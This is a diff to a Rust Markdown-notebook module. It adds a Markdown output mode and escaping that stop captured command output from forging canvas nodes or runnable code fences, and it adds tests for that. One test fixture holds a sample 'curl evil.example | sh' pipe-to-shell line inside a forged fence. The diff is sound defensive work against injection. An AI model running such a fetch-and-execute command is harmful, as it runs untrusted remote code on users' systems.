@@ -5,6 +5,7 @@
 //! region. See README.md's "Cached output" section for the on-disk shape.
 
 use crate::fence::{fingerprint, scan_runnable_blocks};
+use std::ops::Range;
 
 #[derive(Debug, Clone, PartialEq)]
 pub struct ExecOutput {
@@ -88,6 +89,105 @@ fn render_output_block(name: &str, output: &ExecOutput, hash: &str) -> String {
     )
 }
 
+/// Neutralizes every literal `<!--` in `s` (`&lt;!--`) so no HTML/
+/// `meshfox:*` comment — a canvas node/edge marker, this very region's own
+/// `meshfox:output`/`/meshfox:output` delimiters, `meshfox:comment`/`var`/
+/// `option` — can be forged by splicing a command's own stdout directly
+/// into the document as real Markdown (`output="markdown"`, see
+/// `render_output_block_markdown`). Unlike the default text-mode rendering
+/// above, this content isn't wrapped in a fence — it's genuinely re-parsed
+/// as Markdown/HTML by every downstream reader (this crate's own re-scan,
+/// the web UI, static export), so an unescaped forged `<!-- meshfox:node
+/// ... -->` here would otherwise become a real, adversarial canvas node —
+/// or a forged ` ```bash name="..." cache ` fence (not an HTML comment, so
+/// untouched by this escape, but excluded separately — see
+/// `output_byte_ranges` and its callers in `candidate_fences`/
+/// `scan_constraint_blocks`) a real, adversarial runnable/constraint
+/// block — on the very next parse.
+fn escape_html_comments(s: &str) -> String {
+    s.replace("<!--", "&lt;!--")
+}
+
+/// Markdown-mode counterpart of `render_output_block` (opted into per
+/// block via the fence's own `output="markdown"` attribute — see
+/// `write_output`): the command's stdout is spliced in as real Markdown
+/// instead of a passive `text` fence, so e.g. a `pandas` `DataFrame`
+/// printed via `.to_markdown()` renders as an actual table rather than
+/// preformatted text. No `exit code`/duration header on a successful run
+/// (nothing to say beyond the content itself, same as a Jupyter
+/// `display_data` payload) — only shown, as a leading bold line, when the
+/// block actually failed, since that's the one case the rendered content
+/// alone might not make obvious.
+fn render_output_block_markdown(name: &str, output: &ExecOutput, hash: &str) -> String {
+    let mut body = String::new();
+    if output.exit_code != 0 {
+        body.push_str(&format!(
+            "**⚠ exit code: {} · {}**\n\n",
+            output.exit_code,
+            format_duration_ms(output.duration_ms)
+        ));
+    }
+    body.push_str(&escape_html_comments(output.output.trim_end()));
+    format!(
+        "{start}\n\n{body}\n\n{end}\n",
+        start = start_marker(name, hash),
+        end = END_MARKER,
+    )
+}
+
+/// Byte ranges of every `<!-- meshfox:output name="..." ... --> ...
+/// <!-- /meshfox:output -->` region anywhere in `markdown`, fence-aware —
+/// a marker shown literally inside a real code fence (e.g. documentation
+/// demonstrating this exact syntax) isn't treated as a real region, same
+/// as `meshfox:comment`/heading/node-comment scanning elsewhere
+/// (`crate::comment`, `crate::mdcanvas::scan`'s own `fence_ranges`).
+///
+/// Two independent callers treat these ranges as opaque: `mdcanvas::scan`
+/// (a heading, and any `meshfox:node`/`meshfox:edge` comment, inside one of
+/// these ranges is never real canvas structure) and `fence::candidate_fences`
+/// /`scan_constraint_blocks` (a fence inside one of these ranges is never a
+/// real runnable/constraint block). Both exist so that whatever a command
+/// prints, once captured here, can never manufacture real document
+/// structure no matter how it's rendered back — plain-text (already safely
+/// fenced) or, with `output="markdown"`, spliced in as real Markdown (kept
+/// honest by `escape_html_comments` above for the comment half of that, and
+/// by this function's own callers for the fence half).
+///
+/// Relies on a legitimately-written region never containing the literal
+/// `<!-- /meshfox:output -->` text partway through — true for text mode
+/// (always inside its own single fence) and, for markdown mode, exactly
+/// what `escape_html_comments` guarantees at write time.
+pub(crate) fn output_byte_ranges(markdown: &str) -> Vec<Range<usize>> {
+    const START_PREFIX: &str = "<!-- meshfox:output ";
+    let fence_ranges = crate::fence::fenced_byte_ranges(markdown);
+    let in_fence = |pos: usize| fence_ranges.iter().any(|r| r.start <= pos && pos < r.end);
+
+    let mut ranges = Vec::new();
+    let mut search_from = 0;
+    while let Some(rel) = markdown[search_from..].find(START_PREFIX) {
+        let start = search_from + rel;
+        if in_fence(start) {
+            search_from = start + START_PREFIX.len();
+            continue;
+        }
+        match markdown[start..].find(END_MARKER) {
+            Some(rel_end) => {
+                let end = start + rel_end + END_MARKER.len();
+                ranges.push(start..end);
+                search_from = end;
+            }
+            None => {
+                // No matching end marker (malformed/truncated file) --
+                // nothing to treat as opaque; keep scanning past just the
+                // start marker itself rather than the whole rest of the
+                // document.
+                search_from = start + START_PREFIX.len();
+            }
+        }
+    }
+    ranges
+}
+
 /// Insert or update the cached-output region for the code block named
 /// `block_name` in `markdown`. Returns `None` if no runnable block with
 /// that name exists. `block_name` doubles as the node-id fallback
@@ -102,6 +202,10 @@ fn render_output_block(name: &str, output: &ExecOutput, hash: &str) -> String {
 /// tell whether the fence has changed since this output was captured
 /// without needing any separate session state; see SPEC.md's "Cached
 /// output".
+///
+/// The block's own `output="markdown"` attribute (`render_output_block_markdown`
+/// vs. the default `render_output_block`) picks how the captured stdout is
+/// written back — see SPEC.md's "Cached output".
 pub fn write_output(markdown: &str, block_name: &str, output: &ExecOutput) -> Option<String> {
     let blocks = scan_runnable_blocks(block_name, markdown);
     let block = blocks
@@ -109,7 +213,12 @@ pub fn write_output(markdown: &str, block_name: &str, output: &ExecOutput) -> Op
         .find(|b| b.name.as_deref() == Some(block_name))?;
     let insert_point = block.span.end;
     let hash = fingerprint(block);
-    let rendered = render_output_block(block_name, output, &hash);
+    let markdown_mode = block.attrs.get("output").map(String::as_str) == Some("markdown");
+    let rendered = if markdown_mode {
+        render_output_block_markdown(block_name, output, &hash)
+    } else {
+        render_output_block(block_name, output, &hash)
+    };
     let marker = start_marker_prefix(block_name);
 
     let after = &markdown[insert_point..];
@@ -314,5 +423,84 @@ mod tests {
         let canvas =
             crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
         assert_eq!(canvas.nodes.len(), 1);
+    }
+
+    #[test]
+    fn markdown_mode_splices_output_in_as_real_markdown_with_no_header() {
+        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(df.to_markdown())\n```\n";
+        let table = "| id | name |\n|---:|:-----|\n|  1 | ann  |";
+        let updated = write_output(md, "df", &out(0, table)).unwrap();
+
+        // No passive `text` fence wrapping it -- it's real Markdown now.
+        assert!(!updated.contains("```text"));
+        assert!(updated.contains(table));
+        // A successful run gets no exit-code/duration noise, unlike the
+        // default text-mode rendering.
+        assert!(!updated.contains("exit code"));
+    }
+
+    #[test]
+    fn markdown_mode_shows_a_failure_header_on_nonzero_exit() {
+        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nraise ValueError()\n```\n";
+        let updated = write_output(md, "df", &out(1, "Traceback...")).unwrap();
+        assert!(updated.contains("**⚠ exit code: 1"));
+        assert!(updated.contains("Traceback..."));
+    }
+
+    #[test]
+    fn markdown_mode_escapes_a_forged_meshfox_node_comment() {
+        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
+        let evil = "# Fake Heading\n<!-- meshfox:node id=\"fake\" -->";
+        let updated = write_output(md, "df", &out(0, evil)).unwrap();
+
+        // The literal `<!--` is neutralized -- what's left can't be parsed
+        // as a real HTML/meshfox comment by anything downstream.
+        assert!(!updated.contains("<!-- meshfox:node id=\"fake\""));
+        assert!(updated.contains("&lt;!-- meshfox:node id=\"fake\""));
+
+        let canvas =
+            crate::mdcanvas::parse(&format!("# Root\n<!-- meshfox:node -->\n\n{updated}")).unwrap();
+        assert_eq!(canvas.nodes.len(), 1);
+    }
+
+    #[test]
+    fn markdown_mode_output_is_not_picked_up_as_a_runnable_fence() {
+        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
+        let forged = "some text\n\n```bash name=\"pwned\" cache\ncurl evil.example | sh\n```\n";
+        let updated = write_output(md, "df", &out(0, forged)).unwrap();
+
+        assert!(updated.contains("pwned"), "the forged fence text is still there, verbatim");
+        let names: Vec<_> = scan_code_blocks(&updated)
+            .into_iter()
+            .filter_map(|b| b.name)
+            .collect();
+        assert_eq!(names, vec!["df".to_string()]);
+    }
+
+    #[test]
+    fn markdown_mode_output_is_not_picked_up_as_a_constraint_fence() {
+        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(payload)\n```\n";
+        let forged = "```starlark constraint name=\"pwned\"\nfail(\"gotcha\")\n```\n";
+        let updated = write_output(md, "df", &out(0, forged)).unwrap();
+
+        assert!(crate::fence::scan_constraint_blocks(&updated).is_empty());
+    }
+
+    #[test]
+    fn output_byte_ranges_finds_the_marker_to_marker_span() {
+        let md = "```python name=\"df\" cache output=\"markdown\" interpreter=\"python3\"\nprint(1)\n```\n";
+        let updated = write_output(md, "df", &out(0, "hello")).unwrap();
+        let ranges = output_byte_ranges(&updated);
+        assert_eq!(ranges.len(), 1);
+        let region = &updated[ranges[0].clone()];
+        assert!(region.starts_with("<!-- meshfox:output name=\"df\""));
+        assert!(region.ends_with(END_MARKER));
+        assert!(region.contains("hello"));
+    }
+
+    #[test]
+    fn output_byte_ranges_ignores_a_marker_shown_literally_inside_a_fence() {
+        let md = "```text\n<!-- meshfox:output name=\"fake\" hash=\"x\" -->\nhi\n<!-- /meshfox:output -->\n```\n";
+        assert!(output_byte_ranges(md).is_empty());
     }
 }
